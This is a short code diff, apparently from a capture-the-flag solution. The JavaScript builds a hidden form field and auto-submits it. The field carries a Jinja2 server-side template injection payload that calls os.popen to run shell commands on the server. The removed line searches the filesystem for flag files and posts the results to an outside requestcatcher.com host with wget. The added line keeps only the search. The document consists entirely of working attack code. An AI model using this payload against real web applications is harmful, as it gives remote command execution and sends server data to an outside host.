@@ -14,7 +14,7 @@
       const i = document.createElement('input');
       i.type = 'hidden';
       i.name = 'comment';
-      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('find \/ -name "*flag*" > \/tmp\/find-flag.txt | wget https:\/\/singetu0096.requestcatcher.com\/ --post-file=\/tmp\/find-flag.txt').read()}}`;
+      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('find \/ -name "*flag*"').read()}}`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
